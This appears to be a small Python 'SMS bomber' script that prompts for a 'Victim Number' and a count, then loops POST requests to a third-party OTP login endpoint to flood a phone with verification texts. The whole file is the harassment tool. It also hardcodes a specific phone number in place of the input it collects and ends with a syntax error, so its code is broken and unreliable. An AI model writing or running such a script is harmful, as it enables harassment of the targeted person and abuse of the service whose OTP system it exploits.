import requests
from requests.structures import CaseInsensitiveDict
number=str(input("Enter Victim Number: "))
amount=int(input("Enter SMS Amount: "))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone=01988420321"

for i in range (amount):
	resp = requests.post(url, headers=headers, data=data)

print(str(i+1)+"SMS SENT"))
